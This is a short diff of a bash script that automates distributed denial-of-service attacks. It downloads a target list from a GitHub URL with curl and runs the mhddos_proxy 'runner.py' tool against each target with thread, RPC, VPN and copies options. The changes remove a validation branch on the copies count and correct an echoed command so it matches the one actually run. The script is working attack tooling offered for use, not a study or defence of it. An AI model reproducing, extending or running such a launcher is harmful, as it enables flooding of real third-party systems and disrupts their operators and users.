@@ -87,9 +87,6 @@ then
 elif ((copies_num_sametargets < 1));
 then
 	copies_num_sametargets=1
-elif ((num_of_copies != 1 && num_of_copies != 2 && num_of_copies != 3));
-then
-	copies_num_sametargets=1
 fi
 #...
 rand=3
@@ -163,7 +160,7 @@ do
              		# Filter and only get lines that not start with "#". Then get one target from that filtered list.
             		cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/alexnest-ua/targets/main/targets_linux | cat | grep "^[^#]")")
                 	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - full cmd:\n"
-            		echo "python3 runner.py $cmd_line --rpc $rpc -t $threads --vpn $copies_num_sametargets"
+            		echo "python3 runner.py $cmd_line --rpc $rpc -t $threads --vpn --copies $copies_num_sametargets"
             		cd ~/mhddos_proxy
             		python3 runner.py $cmd_line --rpc $rpc -t $threads --vpn --copies $copies_num_sametargets
 	    		sleep 20s
